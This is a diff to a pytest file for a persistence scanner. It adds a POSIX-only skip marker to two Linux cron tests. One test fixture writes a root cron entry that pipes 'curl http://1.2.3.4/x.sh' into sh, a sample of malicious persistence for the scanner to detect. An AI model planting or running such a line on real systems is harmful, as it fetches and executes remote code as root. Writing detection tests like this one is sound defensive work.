@@ -1,5 +1,6 @@
 """Tests for aegis.scanners.persistence: parsing, decisions and a live Linux run."""
 
+import os
 import plistlib
 
 import pytest
@@ -481,6 +482,10 @@ def linux_tree(tmp_path):
     return tmp_path, ps.LinuxPaths(etc=etc, spool=(spool,), homes=(home,))
 
 
+posix_only = pytest.mark.skipif(os.name == "nt", reason="Linux/macOS collectors only run on POSIX systems")
+
+
+@posix_only
 def test_linux_cron_collection_and_assessment(linux_tree):
     root, lp = linux_tree
     (lp.etc / "crontab").write_text("SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
@@ -637,6 +642,7 @@ def test_collect_entries_runs_on_this_os():
         assert {"type", "location", "name", "command", "path", "enabled"} <= set(e)
 
 
+@posix_only
 def test_scanner_end_to_end_on_linux_tree(monkeypatch, linux_tree, ctx):
     root, lp = linux_tree
     (lp.etc / "cron.d" / "evil").write_text("* * * * * root curl http://1.2.3.4/x.sh | sh\n")
